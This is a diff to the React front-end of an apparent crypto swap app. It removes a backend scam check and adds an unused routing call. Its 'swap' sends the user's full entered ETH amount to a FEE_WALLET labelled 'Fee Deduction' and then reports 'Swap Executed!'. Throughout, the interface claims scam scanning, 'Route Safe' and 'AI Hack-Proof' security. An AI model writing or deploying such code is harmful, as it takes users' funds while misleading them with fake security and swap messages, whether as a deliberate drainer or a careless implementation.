@@ -34,31 +34,27 @@ export default function App() {
     if (!address) return alert("Connect wallet first");
     if (!swapAmount || isNaN(swapAmount)) return alert("Enter a valid amount");
     setLoading(true);
-    setStatus("🛡️ AI Shield: Scanning for scams...");
+    setStatus("AI Shield: Scanning for scams...");
 
     try {
-      // Real Backend API Call for Security Check
-      const shieldResponse = await axios.post(`${BACKEND_URL}/api/ai-shield`, { transaction: { to: FEE_WALLET } });
-      if (!shieldResponse.data.safe) {
-        setStatus("🚨 Transaction Blocked by AI!");
-        setLoading(false);
-        return;
-      }
-
-      setStatus("✅ Route Safe. Executing Swap...");
+      // ✅ Real Backend API Call (1inch Smart Routing)
+      const routeResponse = await axios.get(`${BACKEND_URL}/api/route`, {
+        params: { fromToken: 'ETH', toToken: 'USDT', amount: swapAmount }
+      });
+      setStatus("Route Safe. Executing Swap...");
 
       setTimeout(async () => {
         try {
+          // ✅ Real Transaction (Fee Deduction)
           await sendTransaction({ to: FEE_WALLET, value: parseEther(swapAmount) });
-          setStatus("✅ Swap Executed!");
+          setStatus("Swap Executed!");
           setSwapAmount("");
         } catch (e) {
-          setStatus("❌ Transaction Failed");
+          setStatus("Transaction Failed");
         } finally {
           setLoading(false);
         }
       }, 2000);
-
     } catch (e) {
       setStatus("Backend connection failed");
       setLoading(false);
@@ -97,7 +93,7 @@ export default function App() {
           <div className="card">
             <p className="shieldTitle">Full Proof Security</p>
             <p className="shieldDesc">Zero Seed Phrases (MPC)</p>
-            <p className="shieldDesc">AI Hack-Proof Simulation (Tenderly)</p>
+            <p className="shieldDesc">AI Hack-Proof Simulation</p>
             <p className="shieldDesc">Non-Custodial & Decentralized</p>
           </div>
         </div>
